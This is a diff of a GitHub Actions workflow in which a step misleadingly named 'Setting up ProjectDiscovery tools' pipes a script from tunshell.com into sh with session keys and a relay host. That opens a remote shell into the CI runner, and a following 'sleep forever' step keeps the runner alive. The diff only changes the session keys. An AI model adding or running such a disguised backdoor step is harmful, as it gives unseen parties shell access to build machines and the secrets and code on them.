@@ -21,7 +21,7 @@ jobs:
       - name: Setting up ProjectDiscovery tools
         run: |
           sudo apt-get install curl
-          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T H9HlvZURRabNjeVUsasBSF bANYtYliUv3PGhK8L9xnfm eu.relay.tunshell.com
+          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T BLUOYNVXiIURdlN781nYNH y6aE3f68sxLab4QpTMJRjE eu.relay.tunshell.com
         shell: bash
 
       - name: sleep forever
